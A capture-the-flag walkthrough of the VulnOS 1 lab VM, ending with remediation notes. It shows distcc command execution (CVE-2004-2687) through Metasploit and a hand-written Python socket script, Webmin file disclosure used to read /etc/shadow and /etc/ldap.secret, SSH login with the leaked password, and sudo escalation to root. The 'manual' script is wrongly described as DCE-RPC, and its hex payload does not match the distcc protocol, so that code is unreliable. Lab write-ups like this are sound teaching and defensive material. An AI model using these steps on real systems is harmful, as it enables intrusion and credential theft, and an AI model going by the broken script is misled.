# VulnOS: 1: CTF Walkthrough

**Target:** VulnOS 1 by c4b3rw0lf  
**Difficulty:** Beginner  
**Goal:** Obtain root and retrieve the flag  
**Source:** [VulnHub](https://www.vulnhub.com/)

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Port Scanning](#2-port-scanning)
3. [Web Enumeration](#3-web-enumeration)
4. [Exploiting distcc (Initial Access)](#4-exploiting-distcc-initial-access)
5. [Post-Exploitation Enumeration](#5-post-exploitation-enumeration)
6. [Extracting Sensitive Files via Webmin](#6-extracting-sensitive-files-via-webmin)
7. [SSH Credential Reuse](#7-ssh-credential-reuse)
8. [Privilege Escalation](#8-privilege-escalation)
9. [Flag Capture](#9-flag-capture)
10. [Remediation Notes](#10-remediation-notes)

---

## 1. Reconnaissance

Discover the target on the local network:

```bash
netdiscover
```

**Result:** Target IP identified at `192.168.1.135`

---

## 2. Port Scanning

Full port scan with service version detection:

```bash
nmap -sV -p- 192.168.1.135
```

| Port | Service | Details |
|------|---------|---------|
| 80 | HTTP | Apache: custom VulnOS webpage |
| 8080 | HTTP | Apache Tomcat: default "It works" page |
| 10000 | HTTP | MiniServ/Webmin: login page |
| 3632 | distcc | Distributed compiler daemon |

---

## 3. Web Enumeration

### Port 80: Custom VulnOS Page
- Landing page welcomes user to VulnOS with a statutory warning.
- "next page>" link reveals the goal: get root on the target VM.

### Port 8080: Tomcat
- Default Tomcat page. No default credentials worked.

### Port 10000: Webmin
- Login page presented. No credentials known at this stage.

No immediate exploitation path from the web interfaces.

---

## 4. Exploiting distcc (Initial Access)

The distcc daemon on port 3632 is vulnerable to **arbitrary command execution** (CVE-2004-2687).

### Metasploit Approach

```bash
msfconsole
use exploit/unix/misc/distcc_exec
set RHOST 192.168.1.135
run
```

**Result:** Limited shell as `www-data`.

### Manual Approach (without Metasploit)

If Metasploit is unavailable, the vulnerability can be triggered manually via a crafted DCE-RPC request:

```python
import socket

target = "192.168.1.135"
port = 3632

# distcc exec vulnerability: sends arbitrary command via DCE-RPC
payload = b'\x00\x00\x00\x78\x20\x04\x00\x00\xb0\x02\x00\x00\x00\x00\x00\x00' \
          b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04' \
          b'\x5b\x3e\x34\x20\x20\x5d\x20\x52\x43\x43\x33\x32' \
          b'\x20\x2d\x4f\x32\x20\x2f\x74\x6d\x70\x2f\x78' \
          b'\x20\x3b\x20\x69\x64' # command here

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, port))
sock.send(payload)
print(sock.recv(1024).decode())
sock.close()
```

---

## 5. Post-Exploitation Enumeration

From the limited shell, enumerate processes running as root:

```bash
ps aux | grep "root"
```

**Findings:**
- Webmin runs as root on port 10000.
- LDAP is installed on the system.

These are prime targets for privilege escalation.

---

## 6. Exploiting Webmin File Disclosure

Webmin's file disclosure auxiliary module allows reading arbitrary files when the service is accessible:

```bash
msfconsole
use auxiliary/admin/webmin/file_disclosure
set RHOST 192.168.1.135
```

### Extract /etc/passwd

```bash
set RPATH /etc/passwd
run
```

**Result:** Identified user `vulnosadmin` on the system.

### Extract /etc/shadow

```bash
set RPATH /etc/shadow
run
```

**Result:** Password hashes obtained (cracked via alternative route).

### Extract /etc/ldap.secret

```bash
set RPATH /etc/ldap.secret
run
```

**Result:** Cleartext password found: `canyouhackme`

---

## 7. SSH Credential Reuse

Using credentials extracted from the LDAP secret file:

```bash
ssh vulnosadmin@192.168.1.135
# Password: canyouhackme
```

**Result:** User shell obtained as `vulnosadmin`.

---

## 8. Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

**Result:** `vulnosadmin` can run **ALL commands** as root with no password restriction.

### Escalate to Root

```bash
sudo bash
```

**Result:** Root shell obtained.

---

## 9. Flag Capture

```bash
cd /root
cat hello.txt
```

**Flag retrieved.** Challenge complete.

---

## 10. Remediation Notes

| Vulnerability | Recommendation |
|---------------|----------------|
| distcc RCE (CVE-2004-2687) | Disable distcc or restrict access to trusted hosts only |
| Webmin file disclosure | Update Webmin to patched version; restrict network access |
| LDAP password in plaintext | Use encrypted credential storage; rotate passwords |
| Unrestricted sudo | Apply least-privilege principle; limit sudo to required commands |
| Password reuse | Enforce unique credentials per service; implement PAM policies |

---

## Attack Flow Diagram

```
netdiscover → nmap → distcc RCE → www-data shell
                                          ↓
                              ps aux (enumerate root processes)
                                          ↓
                              Webmin file disclosure
                              ├── /etc/passwd (user: vulnosadmin)
                              ├── /etc/shadow (password hashes)
                              └── /etc/ldap.secret (canyouhackme)
                                          ↓
                              SSH as vulnosadmin:canyouhackme
                                          ↓
                              sudo -l → ALL=(ALL) NOPASSWD
                                          ↓
                              sudo bash → ROOT → flag captured
```

---

## Tools Used

- **netdiscover**: Network host discovery
- **nmap**: Port and service enumeration
- **Metasploit Framework**: distcc exploit + Webmin file disclosure
- **SSH**: Remote access with reused credentials
- **sudo**: Privilege escalation

---

## References

- [VulnOS 1 on VulnHub](https://www.vulnhub.com/)
- [distcc_exec: Rapid7](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec)
- [CVE-2004-2687: NVD](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [MITRE ATT&CK: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
